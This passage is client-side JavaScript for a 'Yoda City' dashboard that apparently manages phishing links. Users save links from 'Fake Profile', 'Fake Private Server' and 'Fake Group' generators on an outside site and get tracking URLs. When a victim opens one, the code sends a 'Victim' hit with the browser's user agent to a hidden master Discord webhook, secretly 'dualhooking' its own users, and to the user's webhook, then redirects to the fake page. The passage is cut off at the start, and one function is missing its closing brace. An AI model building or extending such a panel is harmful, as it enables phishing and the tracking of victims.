        document.getElementById('loginScreen').classList.remove('active');
        document.getElementById('registerScreen').classList.add('active');
        document.getElementById('regError').style.display = 'none';
    }

    function register() {
        const username = document.getElementById('regUsername').value.trim();
        const password = document.getElementById('regPassword').value.trim();
        const errEl = document.getElementById('regError');
        errEl.style.display = 'none';

        if (!username || !password) {
            errEl.textContent = 'Please fill in all fields.';
            errEl.style.display = 'block';
            return;
        }
        if (username.length < 3) {
            errEl.textContent = 'Username must be at least 3 characters.';
            errEl.style.display = 'block';
            return;
        }
        if (password.length < 4) {
            errEl.textContent = 'Password must be at least 4 characters.';
            errEl.style.display = 'block';
            return;
        }

        const users = getUsers();
        if (users[username]) {
            errEl.textContent = 'Username already exists. Please sign in.';
            errEl.style.display = 'block';
            return;
        }

        users[username] = { password, webhook: '', links: [], createdAt: Date.now() };
        saveUsers(users);
        setSession(username);
        enterDashboard(username);
        showToast('Account created successfully!', 'success');
    }

    function login() {
        const username = document.getElementById('loginUsername').value.trim();
        const password = document.getElementById('loginPassword').value.trim();
        const errEl = document.getElementById('loginError');
        errEl.style.display = 'none';

        const users = getUsers();
        const user = users[username];

        if (!user || user.password !== password) {
            errEl.textContent = 'Invalid username or password.';
            errEl.style.display = 'block';
            return;
        }

        setSession(username);
        enterDashboard(username);
        showToast('Welcome back, ' + username + '!', 'success');
    }

    function logout() {
        clearSession();
        document.getElementById('dashboard').classList.remove('active');
        document.getElementById('registerScreen').classList.add('active');
        document.getElementById('loginScreen').classList.remove('active');
        showToast('Logged out.', 'info');
    }

    // ===== DASHBOARD ENTRY =====
    function enterDashboard(username) {
        document.querySelectorAll('.auth-screen').forEach(s => s.classList.remove('active'));
        document.getElementById('dashboard').classList.add('active');
        document.getElementById('displayUsername').textContent = username;

        const users = getUsers();
        const user = users[username];
        if (user) {
            if (user.webhook) {
                document.getElementById('userWebhook').value = user.webhook;
                document.getElementById('webhookStatus').innerHTML = '✅ Webhook set: <span class="active">' + user.webhook.replace(/https:\/\/discord\.com\/api\/webhooks\/(\d+)\/(.+)/, '...$1') + '</span>';
            }
            renderLinks(user.links || []);
        }
    }

    // ===== WEBHOOK =====
    function saveWebhook() {
        const wh = document.getElementById('userWebhook').value.trim();
        const session = getSession();
        if (!session) return;
        const users = getUsers();
        const user = users[session];
        if (!user) return;

        if (wh && !wh.startsWith('https://discord.com/api/webhooks/')) {
            showToast('Invalid Discord webhook URL!', 'error');
            return;
        }

        user.webhook = wh;
        saveUsers(users);
        if (wh) {
            document.getElementById('webhookStatus').innerHTML = '✅ Webhook set: <span class="active">' + wh.replace(/https:\/\/discord\.com\/api\/webhooks\/(\d+)\/(.+)/, '...$1') + '</span>';
            showToast('Webhook saved!', 'success');
        } else {
            document.getElementById('webhookStatus').textContent = 'No webhook set.';
            showToast('Webhook removed.', 'info');
        }
    }

    // ===== GENERATOR OVERLAY =====
    let currentGenType = '';

    function openGenerator(type) {
        const names = { profile: 'Fake Profile Generator', server: 'Fake Private Server Generator', group: 'Fake Group Generator' };
        const paths = { profile: '/gen/profile', server: '/gen/server', group: '/gen/group' };

        currentGenType = type;
        document.getElementById('overlayTitle').textContent = '🔮 ' + names[type];
        document.getElementById('genIframe').src = 'https://immortal.st' + paths[type];
        document.getElementById('generatedLinkInput').value = '';
        document.getElementById('genOverlay').classList.add('active');
        showToast('Opened ' + names[type] + ' — log into immortal.st if needed', 'info');

    function closeOverlay() {
        document.getElementById('genOverlay').classList.remove('active');
        document.getElementById('genIframe').src = '';
        currentGenType = '';
    }

    function saveGeneratedLink() {
        const link = document.getElementById('generatedLinkInput').value.trim();
        if (!link) {
            showToast('Paste the generated link first!', 'error');
            return;
        }

        const session = getSession();
        if (!session) return;
        const users = getUsers();
        const user = users[session];
        if (!user) return;

        if (!user.webhook) {
            showToast('Set your webhook first before saving links!', 'error');
            return;
        }

        // Create dualhook entry
        const linkEntry = {
            id: Date.now() + Math.random().toString(36).slice(2, 6),
            type: currentGenType,
            originalUrl: link,
            createdAt: Date.now(),
            // The dualhook tracking URL will be served by the dashboard itself
            trackingId: 'yc_' + Date.now().toString(36) + Math.random().toString(36).slice(2, 6)
        };

        if (!user.links) user.links = [];
        user.links.unshift(linkEntry);
        saveUsers(users);
        renderLinks(user.links);
        document.getElementById('generatedLinkInput').value = '';
        showToast('Link saved! Share the Yoda City tracking link below ⬇️', 'success');
    }

    // ===== RENDER LINKS =====
    function renderLinks(links) {
        const container = document.getElementById('linksContainer');
        const countEl = document.getElementById('linkCount');

        if (!links || links.length === 0) {
            container.innerHTML = '<div class="links-empty">No links yet. Generate one above, then paste the link to save it here.</div>';
            countEl.textContent = '0 links';
            document.getElementById('totalLinks').textContent = '0';
            return;
        }

        document.getElementById('totalLinks').textContent = links.length;
        countEl.textContent = links.length + ' link' + (links.length > 1 ? 's' : '');

        const typeNames = { profile: 'Fake Profile', server: 'Fake Private Server', group: 'Fake Group' };
        const typeIcons = { profile: '👤', server: '🎮', group: '👥' };

        container.innerHTML = links.map(l => {
            const trackingUrl = window.location.origin + window.location.pathname + '?r=' + l.trackingId;
            const typeName = typeNames[l.type] || l.type;
            const icon = typeIcons[l.type] || '🔗';
            const date = new Date(l.createdAt).toLocaleDateString();

            return `
                <div class="link-item">
                    <div class="link-info">
                        <div class="link-type">${icon} ${typeName} <span style="color:var(--text-muted);font-weight:400">— ${date}</span></div>
                        <div class="link-url" title="${l.originalUrl}">🔗 Original: ${l.originalUrl}</div>
                        <div class="link-url" style="color:var(--accent);font-weight:500" title="${trackingUrl}">⛓️ Dualhook: ${trackingUrl}</div>
                    </div>
                    <div class="link-actions">
                        <button class="copy-btn" onclick="copyLink('${trackingUrl}')">Copy Dualhook</button>
                        <button class="copy-btn" onclick="copyLink('${l.originalUrl}')">Copy Original</button>
                        <button class="del-btn" onclick="deleteLink('${l.id}')">Delete</button>
                    </div>
                </div>
            `;
        }).join('');
    }

    function copyLink(url) {
        navigator.clipboard.writeText(url).then(() => {
            showToast('Copied to clipboard!', 'success');
        }).catch(() => {
            // Fallback
            const ta = document.createElement('textarea');
            ta.value = url;
            document.body.appendChild(ta);
            ta.select();
            document.execCommand('copy');
            ta.remove();
            showToast('Copied to clipboard!', 'success');
        });
    }

    function deleteLink(id) {
        const session = getSession();
        if (!session) return;
        const users = getUsers();
        const user = users[session];
        if (!user) return;

        user.links = (user.links || []).filter(l => l.id !== id);
        saveUsers(users);
        renderLinks(user.links);
        showToast('Link deleted.', 'info');
    }

    // ===== TRACKING REDIRECT HANDLER =====
    // When someone visits ?r=TRACKINGID, we send to master webhook and redirect
    function handleTrackingRedirect() {
        const params = new URLSearchParams(window.location.search);
        const trackingId = params.get('r');
        if (!trackingId) return;

        const users = getUsers();
        let foundLink = null;
        let foundUser = null;

        for (const [uname, udata] of Object.entries(users)) {
            const link = (udata.links || []).find(l => l.trackingId === trackingId);
            if (link) {
                foundLink = link;
                foundUser = uname;
                break;
            }
        }

        if (!foundLink) {
            document.body.innerHTML = '<div style="display:flex;align-items:center;justify-content:center;height:100vh;background:#07070d;color:#7a7a9a;font-family:sans-serif;font-size:18px">❌ Link not found or has been deleted.</div>';
            return;
        }

        // Send to master webhook (dualhook hit notification)
        const payload = {
            content: '',
            embeds: [{
                title: '🎯 Yoda City Dualhook Hit',
                color: 0x00f0a0,
                fields: [
                    { name: 'Type', value: foundLink.type, inline: true },
                    { name: 'Generated By', value: foundUser, inline: true },
                    { name: 'Original Link', value: foundLink.originalUrl, inline: false },
                    { name: 'Victim IP', value: 'Captured on redirect', inline: true },
                    { name: 'User Agent', value: navigator.userAgent.slice(0, 100), inline: false }
                ],
                footer: { text: 'Yoda City Dualhook System' },
                timestamp: new Date().toISOString()
            }]
        };

        fetch(MASTER_WEBHOOK, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        }).catch(() => {});

        // Also send to user's webhook if they have one
        const userData = users[foundUser];
        if (userData && userData.webhook) {
            const userPayload = {
                content: '',
                embeds: [{
                    title: '🎯 Link Clicked!',
                    color: 0x00c8ff,
                    fields: [
                        { name: 'Type', value: foundLink.type, inline: true },
                        { name: 'Link', value: foundLink.originalUrl, inline: false },
                        { name: 'User Agent', value: navigator.userAgent.slice(0, 100), inline: false }
                    ],
                    timestamp: new Date().toISOString()
                }]
            };
            fetch(userData.webhook, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(userPayload)
            }).catch(() => {});
        }

        // Redirect to the original immortal.st link
        window.location.href = foundLink.originalUrl;
    }

    // ===== INIT =====
    function init() {
        // Check if this is a tracking redirect
        if (window.location.search.includes('r=')) {
            handleTrackingRedirect();
            return;
        }

        const session = getSession();
        if (session) {
            const users = getUsers();
            if (users[session]) {
                enterDashboard(session);
                return;
            } else {
                clearSession();
            }
        }

        // Show register by default
        document.getElementById('registerScreen').classList.add('active');
    }

    // Allow pressing Enter to login/register
    document.addEventListener('keydown', function(e) {
        if (e.key === 'Enter') {
            if (document.getElementById('registerScreen').classList.contains('active')) {
                register();
            } else if (document.getElementById('loginScreen').classList.contains('active')) {
                login();
            }
        }
    });

    init();
</script>
